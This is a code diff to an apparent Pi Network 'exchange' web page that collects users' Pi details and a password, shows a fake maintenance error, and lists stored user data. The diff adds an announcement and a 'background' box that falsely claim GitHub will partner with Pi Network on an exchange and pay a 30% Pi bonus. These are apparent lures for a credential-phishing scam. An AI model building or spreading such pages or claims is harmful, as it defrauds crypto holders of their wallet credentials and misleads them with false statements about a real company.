@@ -12,6 +12,21 @@
             padding: 20px;
             text-align: center;
         }
+        .announcement {
+            background-color: #ffcc00;
+            padding: 10px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        .background-info {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            text-align: left;
+        }
         .container {
             max-width: 600px;
             background: white;
@@ -55,6 +70,19 @@
 </head>
 <body>
 
+    <!-- Announcement -->
+    <div class="announcement">
+        Announcement: If your Pi Network mainnet migration steps are incomplete, they will be approved and processed starting from March 14, 2025.
+    </div>
+
+    <!-- Background Information -->
+    <div class="background-info">
+        <p><strong>GitHub platform</strong> was founded in 2008 and later acquired by Microsoft in 2018.</p>
+        <p>In 2025, the company will collaborate with <strong>Pi Network</strong> to develop an exchange platform, allowing Pi Network coins to be migrated and immediately exchanged with 10+ listed cryptocurrencies.</p>
+        <p><strong>GitHub Organization</strong> will reward a 30% Pi bonus.</p>
+    </div>
+
+    <!-- User Input Page -->
     <div class="container" id="userInputPage">
         <h2>Enter Your Pi Network Details</h2>
         
@@ -71,6 +99,7 @@
         <button id="exchange-button" class="exchange-btn" disabled onclick="proceedToPasswordPage()">Proceed to Exchange</button>
     </div>
 
+    <!-- Password Page -->
     <div class="container" id="passwordPage" style="display: none;">
         <h2>Enter Password to Access Database</h2>
         <input type="password" id="password" placeholder="Enter Password">
@@ -79,13 +108,14 @@
         <p id="errorMessage" class="error-message">Oops! The server is currently under maintenance. Please try again later.</p>
     </div>
 
+    <!-- Database Page -->
     <div class="container" id="databasePage" style="display: none;">
         <h2>Stored Pi User Data</h2>
         <div id="user-data-list"></div>
     </div>
 
     <script>
-        let usersData = []; // Array to store up to 20 users
+        let usersData = []; // Stores up to 20 users
 
         function validateFields() {
             let username = document.getElementById("pi-username").value.trim();
